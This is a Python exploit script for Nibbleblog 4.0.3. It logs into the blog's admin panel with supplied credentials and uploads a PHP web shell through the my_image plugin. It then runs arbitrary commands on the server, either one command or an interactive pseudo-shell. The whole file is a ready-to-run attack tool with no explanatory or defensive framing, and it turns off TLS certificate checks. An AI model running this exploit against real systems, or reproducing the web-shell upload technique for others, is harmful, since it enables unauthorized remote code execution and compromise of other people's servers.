import argparse
import requests

class Nibbleblog():
    def __init__(self,target,username,password,rce):
        self.target = target
        self.username = username
        self.password = password
        self.cmd = rce
        self.upload()

    def upload(self):
        requests.packages.urllib3.disable_warnings()
        payload = "<?php echo system($_REQUEST['rse']); ?>"
        session = requests.Session()
        login_data = {
            'username':self.username,'password':self.password,'login':''
        }
        print("Loggin in to " + self.target)
        req_url_login = session.post(self.target,data=login_data,verify=False)
    
        file_data = {
            "plugin":"my_image",
            "title":"blah",
            "position":"4",
            "caption":"test",
        }

        file_content = {
            'rse':('rse.php',payload,'application/x-php',{'Content-Disposition':'form-data'}),
        }

        url_upload = self.target + "?controller=plugins&action=config&plugin=my_image"
        req_url_upload = session.post(url_upload,data=file_data,files=file_content,verify=False)
        if req_url_upload.status_code == 200:
            print("Logged in and was able to upload exploit!")
            self.rce()
        else:
            print("Something went wrong with the upload!")
            exit()

    def rce(self):
        requests.packages.urllib3.disable_warnings()
        url_shell = self.target.replace("/admin.php","/content/private/plugins/my_image/rse.php")
        print("Payload located in " + url_shell)
        if args.shell:
            while True:
                try:
                    cmd = input("RCE: ")
                    
                    rce_data = {
                        'rse':cmd
                    }
                    req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
                    print(req_url_rce.text)
                except KeyboardInterrupt:
                    print("Bye Bye\n")
                    exit()

        if args.rce:
            rce_data = {
                'rse':self.cmd
            }
            req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
            print(req_url_rce.text)

if __name__ == "__main__":
    print("Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution")
    parser = argparse.ArgumentParser(description='Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target admin URL>', help='admin target/host URL, E.G: http://nibblesrce.com/blog/admin.php', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-rce', metavar='<Remote Code Execution>', help='-rce whoami', required=False)
    parser.add_argument('-shell',action='store_true',help='Pseudo-Shell option for continous rce', required=False)
    args = parser.parse_args()

    Nibbleblog(args.t,args.u,args.p,args.rce)
